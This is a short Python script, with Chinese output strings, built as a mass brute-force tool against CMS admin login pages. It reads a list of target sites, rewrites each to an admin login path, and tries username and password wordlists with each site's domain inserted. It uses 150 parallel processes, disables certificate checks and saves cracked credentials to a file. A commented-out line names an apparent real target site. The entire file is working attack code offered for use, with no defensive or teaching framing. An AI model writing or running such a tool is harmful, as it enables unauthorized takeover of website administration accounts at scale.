#!/usr/bin/env python
# coding:utf-8
from multiprocessing import Pool
import tldextract,requests,time,re
from urllib.parse import urlparse
import requests
import time
import tldextract
from requests.exceptions import ConnectionError

def baopo(line,username,password):

    try:
    
        print("测试:{} {} {}".format(line,username,password))
        
        data = {
            'username': username,
            'password': password,
        }
        
        res = requests.post(
                    url=line,
                    data=data,
                    timeout=15,
                    verify=False,
                )
        print(res.text)
        if '{"code":1' in res.text:
            
            print(line,username,password," ---> 破解成功")
                
            f = open("ok.txt","a+")
                
            f.write("{}  {}  {}\n".format(line,username,password))
                
            f.close()
                
            return "ok"
        
        elif "密码" in res.text:
        
            return "pass"
            
        elif "用户名" in res.text:

            return "user"
    
    except:
    
        return ""

def dedecms(line):

    line = line.strip('\n!')
    
    q = tldextract.extract(line)
    
    result = urlparse(line)
    
    url_http = result.scheme
    
    url_domain = result.netloc
    
    url_path = result.path
    
    line = "{}://{}/admin.php?p=/Index/login".format(url_http,url_domain)

    print(line)
    p = open('pass.txt','r')
    
    pwdt = p.readlines()
    
    p.close()
    
    u = open('user.txt','r')
    
    unmt = u.readlines()
    
    u.close()
    
    for username in unmt:
    
        username = username.strip('\n')
        
        username = username.replace("#domain#",q.domain)
        
        for password in pwdt:
        
            password = password.strip('\n')
            
            password = password.replace("#domain#",q.domain)
            
            text = baopo(line,username,password)
            
            
            if text == "ok":
                
                return
                    
            elif text == "user":

                break
                
    
            time.sleep(1)

if __name__ == '__main__':

    inFile = 'url.txt'
    
    urls = ['{}'.format(str(i)) for i in open(inFile)]
    
    pool = Pool(processes=150)
    
    pool.map(dedecms, urls)
    
    #dedecms("http://myyycmdm.com/login.php?s=Admin/login")
